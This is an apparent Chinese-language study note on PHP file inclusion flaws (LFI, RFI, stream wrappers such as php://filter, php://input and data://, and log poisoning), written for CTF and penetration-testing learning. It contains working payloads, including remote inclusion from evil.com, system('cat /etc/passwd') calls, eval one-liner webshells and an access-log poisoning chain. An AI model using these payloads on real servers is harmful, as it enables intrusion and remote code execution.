# 第七天：文件包含漏洞

## 核心概念

文件包含（File Inclusion）是Web应用中常见的功能，允许在页面中动态加载其他文件内容。当开发者对用户传入的文件路径控制不当时，攻击者可以包含任意文件，造成信息泄露或代码执行。

文件包含的核心特点是：**非PHP格式的文件只要内含PHP代码，被包含时也会按PHP解析执行**。也就是说，一张图片、一段日志、一个文本文件，只要里面有一段PHP代码，通过文件包含加载后这段代码就会被执行。

---

## 一、本地文件包含（LFI）

LFI（Local File Inclusion）是指包含服务器本地的文件。

### 典型漏洞代码

```php
<?php
$file = $_GET['page'];
include($file);
?>
```

### 常见利用

```php
# 读取敏感配置文件
?page=/etc/passwd
?page=/etc/hosts
?page=C:\Windows\System32\drivers\etc\hosts

# 读取网站源码（直接读会被PHP解析，看不到源码）
?page=index.php        # 页面会被执行，看不到代码

# 读取Apache/Nginx日志
?page=/var/log/apache2/access.log
?page=/var/log/nginx/access.log

# 读取PHP配置文件
?page=/etc/php/7.4/apache2/php.ini
```

### 路径截断技巧

PHP <= 5.2 版本中可以用 `%00` 截断（NULL byte injection），让后端自动拼接的后缀（`.php`）失效。高版本已修复。

```php
# 假设后端代码：include($_GET['page'] . '.php')
?page=../../../etc/passwd%00   # PHP <= 5.2 可用
```

## 二、远程文件包含（RFI）

RFI（Remote File Inclusion）是指包含远程服务器上的文件，通常是一个包含恶意PHP代码的文本文件。

### 前置条件

`php.ini` 中 `allow_url_include = On` 和 `allow_url_fopen = On`。注意：`allow_url_include` 默认 Off，`allow_url_fopen` 默认 On，所以 RFI 真正的障碍是 `allow_url_include`。

==`allow_url_fopen` 是允许 PHP “打开”远程文件，而 `allow_url_include` 是允许 PHP 将打开的内容“作为代码执行”。如果要实现远程文件包含（RFI），这两个权限缺一不可==
### 攻击流程

1. 攻击者在自己的VPS上准备一个文件，比如 `http://evil.com/shell.txt`，内容为恶意PHP代码
2. 通过文件包含漏洞加载该文件

```php
?page=http://evil.com/shell.txt
```

服务器会去请求这个远程文件，拿到内容后在本地执行。

### RFI vs LFI

| 类型 | 文件来源 | 前置条件 | 危害 |
|-----|---------|---------|------|
| LFI | 服务器本地 | 无特殊配置要求 | 读取敏感文件、配合文件上传/日志投毒RCE |
| RFI | 远程服务器 | `allow_url_include=On` + `allow_url_fopen=On` | 直接RCE |

## 三、PHP伪协议

PHP提供了一系列内置的流包装器（stream wrappers），可以通过伪协议访问各种I/O流。在文件包含漏洞中，伪协议是非常重要的利用手段。

> PHP >= 5.2 才支持大部分伪协议。

### 3.1 php://filter —— 读取源码

`php://filter` 是最常用的伪协议之一。核心用途是**读取PHP文件的源码**，而不是直接执行它。

普通包含 `index.php` 会让页面被PHP引擎执行，看不到源代码。而通过 `php://filter` 可以先对文件内容进行编码转换再输出，这样就能看到源码了。

**基本语法：**

```php
php://filter/read=convert.base64-encode/resource=index.php
```

**实际利用：**

```
?page=php://filter/read=convert.base64-encode/resource=index.php
```

服务器返回的是一段base64编码的字符串，解码后就是index.php的完整源码。

**常见用法：**

```php
# base64编码读取
?page=php://filter/read=convert.base64-encode/resource=config.php

# 读取当前目录下的文件
?page=php://filter/read=convert.base64-encode/resource=./admin/flag.php

# 链式过滤（先去空格再base64编码）
?page=php://filter/read=string.strip_tags|convert.base64-encode/resource=index.php
```

**为什么是"核心协议"？** filter在CTF和实战中几乎是用得最多的伪协议 —— 它不需要任何额外的php.ini配置，且能稳定地读到任何PHP文件的源码，是信息收集阶段的关键工具。

### 3.2 php://input —— POST传参执行

`php://input` 是一个只读的流，可以访问原始POST请求体中的数据。

**前置条件：** `allow_url_include = On`

**利用方式：** 将原本GET传参的攻击方式改为通过POST传递PHP代码：

```
GET /index.php?page=php://input HTTP/1.1
Host: target.com

POST Body:
<?php system('ls -la'); ?>
```

PHP引擎通过 `include('php://input')` 获取POST请求体中的内容，将其作为PHP代码执行。

**典型利用场景：**

- GET请求长度受限时，改用POST传参
- 绕过某些只检查GET参数的安全策略
- 配合其他漏洞（如文件上传失败时）直接执行任意代码

```php
# POST body传一句话木马
<?php @eval($_POST['cmd']); ?>
```

### 3.3 data:// —— 直接传输PHP代码

`data://` 伪协议允许在URL中直接嵌入数据，包括PHP代码。

**前置条件：**
- `allow_url_fopen = On`
- `allow_url_include = On`

**基本语法：**

```php
data://text/plain,<?php phpinfo();?>
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
```

**实际利用：**

```php
# 直接执行phpinfo
?page=data://text/plain,<?php phpinfo();?>

# base64编码形式（绕过过滤）
?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+

# 执行系统命令
?page=data://text/plain,<?php system('cat /etc/passwd');?>

# 写入一句话木马
?page=data://text/plain,<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST[cmd]);?>');?>
```

**data:// vs php://input：**

| 伪协议 | 传参方式 | 前置条件 | 特点 |
|-------|---------|---------|------|
| php://input | POST body | `allow_url_include=On` | 代码放在请求体中，相对隐蔽 |
| data:// | GET参数中 | `allow_url_fopen=On` + `allow_url_include=On` | 代码直接写在URL里，方便快捷 |

### 3.4 压缩包伪协议

PHP还支持一些与压缩文件相关的伪协议，可以对压缩包内的文件进行操作：

- `zip://archive.zip#file.txt` —— 访问zip压缩包内的文件
- `phar://archive.phar/file.txt` —— 访问phar压缩包内的文件
- `compress.zlib://file.gz` —— 读取gz压缩文件
- `compress.bzip2://file.bz2` —— 读取bz2压缩文件

**利用思路：** 如果能上传一个包含PHP代码的zip文件（哪怕后缀被改了），可以通过 `zip://` 包含其中的恶意文件来执行代码。

```php
# 假设上传了含有shell.php的evil.zip，改名为evil.jpg
?page=zip://uploads/evil.jpg%23shell.php
# %23 是 # 的URL编码
```

这些压缩包协议在实际使用中相对较少，个人了解不多。

### 3.5 伪协议对比总结

| 伪协议 | 核心用途 | 前置条件 | 使用频率 |
|-------|---------|---------|---------|
| php://filter | **读取源码**（base64编码） | 无 | 最高 |
| php://input | POST传参执行代码 | allow_url_include=On | 高 |
| data:// | URL直接传PHP代码 | allow_url_fopen=On + allow_url_include=On | 高 |
| expect:// | 执行系统命令 | 安装expect扩展 | 低 |
| zip:// / phar:// | 包含压缩包内文件 | 无额外配置 | 中 |

## 四、文件包含 + 日志投毒

### 核心思路

文件包含的一个重要特性是：**即使是非PHP格式的文件（图片、日志、文本），只要里面有PHP代码，包含后就会按PHP解析执行**。

利用这一特性，如果能将PHP恶意代码**写入**服务器的某个文件中，再通过文件包含读取它，就能实现RCE。

日志投毒是目前最经典的LFI to RCE利用链之一。

### 攻击流程

1. **找到服务器日志路径**：常见的日志路径有：
   - Apache: `/var/log/apache2/access.log`、`/var/log/apache2/error.log`
   - Nginx: `/var/log/nginx/access.log`、`/var/log/nginx/error.log`
   - 其他Web Server的对应日志目录

2. **向目标发起包含恶意代码的GET请求**：

   ```
   GET /<?php @eval($_POST['cmd']);?> HTTP/1.1
   Host: target.com
   ```

   由于浏览器/工具会编码特殊字符，通常使用Burp Suite或Python脚本发送原始请求。

   服务器日志会记录这个请求，access.log中会出现类似：
   ```
   192.168.1.1 - - [24/Jul/2026:10:00:00 +0800] "GET /<?php @eval($_POST['cmd']);?> HTTP/1.1" 404 512
   ```

3. **通过LFI包含日志文件**，触发一句话木马：

   ```
   ?page=/var/log/apache2/access.log
   ```

   此时access.log中的 `<?php @eval($_POST['cmd']);?>` 会被PHP引擎解析执行，一句话木马生效。

4. **用蚁剑/冰蝎等工具连接**，即可控制服务器。

### 注意事项

- 日志投毒的关键是**写进去的PHP代码不能包含空格被编码**。如果日志中的 `<` 被URL编码为 `%3C`，PHP就无法解析了。
- 有些日志会把特殊字符转义，这类情况需要寻找其他可控的写入点（如SSH日志、邮件日志等）。
- 如果access.log不可读，可以尝试error.log或数据库错误日志。

### 日志投毒变体

除了HTTP访问日志，任何**攻击者可控内容会写入的文件**都可以当作投毒目标：

| 投毒目标 | 写入方式 | 可行性 |
|---------|---------|-------|
| Apache/Nginx access.log | 构造恶意HTTP请求 | 高 |
| SSH日志 (/var/log/auth.log) | SSH登录时用户名注入 | 中 |
| 邮件日志 | 发送含恶意代码的邮件 | 中 |
| 文件上传路径 | 上传含PHP代码的图片 | 高 |
| 数据库错误日志 | 触发含恶意代码的SQL报错 | 低 |

## 五、php.ini相关配置

| 配置项 | 默认值 | 影响 |
|-------|-------|------|
| `allow_url_include` | Off | 控制是否允许 include/require 远程文件和伪协议（php://input、data://） |
| `allow_url_fopen` | On | 控制是否允许通过URL打开远程文件（data://需要此配置） |
| `open_basedir` | 空 | 限制PHP可访问的文件目录范围 |
| `disable_functions` | 空 | 禁用特定函数（如system、exec等） |

---

## 小结

文件包含漏洞的核心利用链：

```
发现参数可控 → 判断LFI/RFI → 读取敏感信息（filter读源码）
                                    ↓
                              需要RCE时：
                              ├── RFI条件满足 → 远程包含shell
                              ├── 可上传文件 → 上传含代码的图片/JPG → LFI包含
                              ├── 知道日志路径 → 日志投毒 → LFI包含
                              └── allow_url_include=On → php://input / data://
```
